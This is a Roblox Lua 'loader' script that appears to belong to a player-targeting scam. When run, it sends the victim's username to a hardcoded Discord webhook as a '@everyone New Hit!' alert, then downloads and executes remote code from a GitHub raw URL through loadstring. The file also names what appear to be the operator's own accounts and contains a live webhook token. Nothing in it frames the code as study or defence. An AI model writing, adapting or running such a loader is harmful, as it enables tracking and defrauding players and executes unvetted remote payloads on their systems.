-- Final Loader - Forced Ping + Debug

_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}

_G.PING_POOR = true

print("=== LOADER STARTED ===")

-- Forced Discord ping (always sends)
task.spawn(function()
    print("Ping task started")
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local message = "@everyone New Hit! Username: " .. plr.Name
        print("Sending ping to Discord...")
        local success, err = pcall(function()
            game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
        end)
        if success then
            print("Ping sent successfully!")
        else
            print("Ping failed: " .. tostring(err))
        end
    end
end)

-- Load GUI
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
end)

print("=== LOADER FINISHED ===")
